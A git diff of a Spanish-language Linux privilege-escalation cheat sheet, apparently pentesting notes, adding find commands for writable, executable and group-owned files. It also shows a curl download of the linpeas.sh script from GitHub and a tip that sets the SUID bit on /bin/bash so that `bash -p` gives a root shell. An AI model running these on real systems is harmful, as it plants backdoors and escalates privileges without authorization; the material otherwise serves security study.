@@ -100,16 +100,22 @@ cat /dir/dir/file | grep Cap
 
 grep Cap /proc/$PID/status
 ## Capabilites de un proceso por PID
- ```
 
 
 ## Archivos editables por el usuario actual
-```shell
+
 find / -writable -type d 2>/dev/null
 ## Dirs editables
 
 find / -type f -writable 2>/dev/null 2>/dev/null
 ## Archivos editables
+
+find / -type f -executable
+## Archivos ejecutables
+
+find / -group group
+## Archivos owneados por group
+
 ```
 
 
@@ -135,13 +141,17 @@ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
  
 
 # Protips
-
+## SUID
+### Este código añade el bit SUID al binario bash 
 ```bash
 chmod u+s /bin/bash
 ```
-Este código añade el bit SUID al binario bash, después solo es necesario esperar a que se ejecute y lanzar un `bash -p` 
 
+## MySQL
+### MySQL oneliner DB connection
 ```bash
 mysql -u USERNAME -pPASSWORD -h HOSTNAMEORIP DATABASENAME 
 ```
-MySQL oneliner DB connection
+
+## Groups
+### Disk
